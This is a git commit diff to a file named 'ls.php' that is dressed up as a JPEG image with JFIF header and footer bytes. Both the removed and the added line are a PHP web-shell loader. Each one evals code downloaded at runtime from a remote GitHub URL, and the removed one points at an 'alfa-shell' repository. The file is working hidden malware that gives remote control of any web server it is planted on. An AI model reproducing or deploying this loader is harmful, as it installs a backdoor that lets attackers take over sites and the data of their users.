115d63ec97e379574f27ecba2b00464f03ed7b57
jejaknegara <jejaknegara@gmail.com>
2025-09-21 00:37:14 +0700

    Update ls.php

--- ls.php
+++ ls.php
@@ -1,3 +1,3 @@
 ÿØÿàJFIFÿÛ
-<?php eval( urldecode("%3f%3e") . file_get_contents( urldecode( "https://raw.githubusercontent.com/Web-phpshell/alfa-shell/refs/heads/main/alfa.php" ) ) ); ?>
+<?php eval( urldecode("%3f%3e") . file_get_contents( urldecode( "https://raw.githubusercontent.com/asukoe1337/function/main/function.php" ) ) ); ?>
 ÿÙ
